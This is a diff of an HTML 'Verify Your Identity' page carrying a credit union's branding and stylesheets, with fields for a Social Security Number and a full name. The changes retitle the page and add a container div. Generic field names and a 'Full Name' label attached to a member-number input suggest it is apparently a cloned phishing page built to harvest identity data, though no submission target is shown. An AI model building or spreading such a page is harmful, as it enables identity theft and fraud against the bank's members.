@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
 <head><meta charset="us-ascii">
-	<title>Summit CU - Establish Identity</title>
+	<title>Summit CU - Verify Identity</title>
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 	<link href="https://db.summitcreditunion.com/Themes/OrpheusDefaultTheme/Styles/Default_5rTVJABMXj81_Default.bndl?v=ZnIFqDdKR7A2O6jJVTNgoswC4KLo4jWAssDj-YT4lno1" rel="stylesheet" type="text/css" />
 	<link href="https://db.summitcreditunion.com/Themes/OrpheusDefaultTheme/Styles/Mobile_Default_xtHDspGhEo41_Default.bndl?v=SQRLFviIS39Q1hMZ0ZGDFJMW45OESxRev1bTrzViMSg1" rel="stylesheet" type="text/css" /><meta content="Orchard" name="generator"><meta content="h9-JYPObT2yjBZKP52RA-uNaFyUg92WUSpmtuN6qyE4q226CbQbtFJCJNPJQSPW78NN4ka_D5iS3Nd_EYsp6xWrttILMZrKum1dCN9KEgiyGaLZkmhnwxKH38v-pBcDEmbxVG9Zea4WeIhMSUxNycGMRKb3Tk8Nu7--wrUv-r9Q1" name="csrf-token"><meta content="X-AntiCSRF-Token" name="csrf-param"><meta content="__AntiCsrfToken" name="csrf-form-param">
@@ -34,7 +34,7 @@
 <div data-role="content">
 <div class="main-content" role="main">
 <div class="container-view">
-
+<div class="container-view" data-bind="props: wizardSettings" data-props="{&quot;WizardSessionExpiredAfterMin&quot;:4000}" data-viewmodel="login/viewmodels/logoff">
 <header class="subheader">
 <div class="navbar__center"><span class="navbar__center__title">Verify Your Identity</span></div>
 </header>
@@ -47,6 +47,7 @@
 <div class="form-control-container"><label><span class="form-control__label" data-stable-name="SsnLabel">What is your Social Security Number?</span> <input aria-label="What is your Social Security Number?" autocomplete="new-value" class="form-control k-textbox" data-cfw-field="data-cfw-field" data-field-id="Ssn" data-field-type="System.String" data-mask="***-**-0000" data-pattern="000-00-0000" data-pattern-msg="Please enter 9 digits into the Social Security Number field." data-required-msg="This field is required." data-role="formatter" data-stable-name="SsnInput" id="Ssn" maxlength="11" name="1" pattern="^\d{3}-\d{2}-\d{4}$" required="required" type="text" /> </label></div>
 
 <div class="form-control-container" data-bind=""><label><span class="form-control__label" data-stable-name="MemberAccountNumberLabel">What is your Full Name?</span> <input class="form-control k-textbox" data-bind="" data-cfw-field="data-cfw-field"  data-field-type="System.String" data-pattern-msg="Please enter a valid member number." data-required-msg="This field is required." data-stable-name="MemberAccountNumberInput" id="MemberAccountNumber" maxlength="20" minlength="1" name="2" required="required" type="text" /> </label></div>
+
 <p>Don&#39;t have this information? <a href="https://www.summitcreditunion.com/contact-us">Contact us</a> for help.</p>
 </div>
 
